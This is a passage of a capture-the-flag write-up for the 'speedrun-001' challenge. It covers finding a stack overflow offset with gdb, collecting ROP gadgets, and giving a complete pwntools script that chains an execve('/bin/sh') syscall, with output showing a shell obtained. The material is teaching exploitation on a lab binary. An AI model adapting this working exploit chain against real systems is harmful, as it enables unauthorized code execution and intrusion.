aaasnaaaaaasoaaaaaaspaaaaaasqaaaaaasraaaaaassaaaaaastaaaaaasuaaaaaasvaaaaaaswaaaaaasxaaaaaasyaaaaaaszaaaaaatbaaaaaatcaaaaaatdaaaaaateaaaaaatfaaaaaatgaaaaaathaaaaaatiaaaaaatjaaaaaatkaaaaaatlaaaaaatmaaaaaatnaaaaaatoaaaaaatpaaaaaatqaaaaaatraaaaaatsaaaaaattaaaaaatuaaaaaatvaaaaaatwaaaaaatxaaaaaatyaaaaaatzaaaaaaubaaaaaaucaaaaaaudaaaaaaueaaaaaaufaaaaaaugaaaaaauhaaaaaauiaaaaaaujaaaaaaukaaaaaaulaaaaaa".  Try "help".
gef➤  i f
Stack level 0, frame at 0x7fffffffdef8:
 rip = 0x400bad; saved rip = 0x6661616161616165
 called by frame at 0x7fffffffdf08
 Arglist at 0x7fffffffdef0, args: 
 Locals at 0x7fffffffdef0, Previous frame's sp is 0x7fffffffdf00
 Saved registers:
  rip at 0x7fffffffdef8
gef➤  pattern search eaaaaaaf
[+] Searching 'eaaaaaaf'
[+] Found at offset 840 (little-endian search) likely
[+] Found at offset 1032 (big-endian search) 
```

Here we can see that the offset from the start of our input to the saved return address is `1032` bytes (`0x6661616161616165` = `eaaaaaaf`). So now that we know how to write over the return address, now we have the question of what to do. Since it is a statically linked binary with no PIE, we can just go for a ROP chain easily (no infoleak needed and lots of gadgets to pick from). The tl;dr for what a ROP Chain is, is when we reuse various pieces of the binaries code (which end in a return) to construct our own code.

The end goal will be to make an execve syscall to execute `/bin/sh` (checout more info about syscalls here: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/). To find the gadgets which will make up the ROP chain I used ROPGadget (https://github.com/JonathanSalwan/ROPgadget). Starting off we will need gadgets to pop values into the `rax`, `rdi`, `rdx`, and `rsi` registers (all of which are used by the `execve` syscall):

```
$	python ROPgadget.py --binary speedrun-001 | grep ": pop rdx ; ret" 
0x00000000004498b5 : pop rdx ; ret
0x000000000045fe71 : pop rdx ; retf
$	python ROPgadget.py --binary speedrun-001 | grep ": pop rax ; ret" 
0x0000000000415664 : pop rax ; ret
0x000000000048cccb : pop rax ; ret 0x22
0x00000000004a9323 : pop rax ; retf
$	python ROPgadget.py --binary speedrun-001 | grep ": pop rdi ; ret" 
0x0000000000400686 : pop rdi ; ret
$	python ROPgadget.py --binary speedrun-001 | grep ": pop rsi ; ret" 
0x00000000004101f3 : pop rsi ; ret
$	python ROPgadget.py --binary speedrun-001 | grep syscall
0x000000000040129c : syscall
```

Following that, we will need a gadget that will allow us to write the string `/bin/sh\x00` somewhere in memory (and an address to write it to). We see that there is a mov instruction that will allow us to store a value at a memory address stored in the `rax` register.

```
$	python ROPgadget.py --binary speedrun-001 | grep mov

.	.	.

0x000000000048d251 : mov qword ptr [rax], rdx ; ret
```

For the memory location, we see that the address `0x6b6000` will work for us since it is in the PIE segment so we know the address of it without an infoleak, and there doesn't appear to be anything significant stored there:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /Hackery/defcon/speedrun/s1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /Hackery/defcon/speedrun/s1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
0x00007ffff7ffa000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  x/4g 0x00000000006b6000
0x6b6000:	0x0	0x0
0x6b6010:	0x0	0x0
```

Lastly we will just need a syscall:

```
$	python ROPgadget.py --binary speedrun-001 | grep syscall

.	.	.

0x000000000040129c : syscall
```

With that, we have everything we need to buil out the ROP Chain. For the execve syscall, it expects three arguments (in addition to `0x3b` being in the `rax` register to specify an execve call). In the `rdi` register it will expect a pointer to the filename to be executed (`/bin.sh`). In the `rsi` and `rdx` registers it will expect pointers to the arguments / enviornment variables for the process (for our purposes we don't need to worry about them, sow e can just set them equal to zero). Our ROP chain will have the following instructions:

```
pop rdx, 0x0068732f6e69622f
pop rax, 0x6b6000
mov qword ptr [rax], rdx ; ret

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
```

Bringing it all together, we get the following exploit:

```
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish pop ROP Gadgets
popRdx = p64(0x4498b5)
popRax = p64(0x415664)
popRsi = p64(0x4101f3)
popRdi = p64(0x400686)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# syscall
syscall = p64(0x40129c)

# Filler to return address
payload = "0"*1032

# Write '/bin/sh\x00' to '0x6b6000'
#pop rdx, 0x0068732f6e69622f
#pop rax, 0x6b6000
#mov qword ptr [rax], rdx ; ret
payload += popRdx
payload += p64(0x0068732f6e69622f)
payload += popRax
payload += p64(0x6b6000)
payload += writeGadget

# Setup args for syscall

# pop rax, 0x3b
payload += popRax
payload += p64(0x3b)

# pop rdi, 0x6b6000
payload += popRdi
payload += p64(0x6b6000)

# pop rsi, 0x0
# pop rdx, 0x0
payload += popRsi
payload += p64(0)
payload += popRdx
payload += p64(0)

# syscall
payload += syscall

# Send the payload
target.send(payload)

target.interactive()
```

When we run it:
```
$	python exploit.py 
[+] Starting local process './speedrun-001': pid 15128
[*] Switching to interactive mode
Hello brave new challenger
Any last words?
This will be the last thing that you say: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\xb5\x98D
$ w
 00:10:18 up  3:05,  1 user,  load average: 0.79, 0.91, 0.93
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               21:33   ?xdm?  16:18   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
 core   exploit.py   pwn   readme.md   speedrun-001  'string 0x1000'
$ 
```

Just like that, we popped a shell!
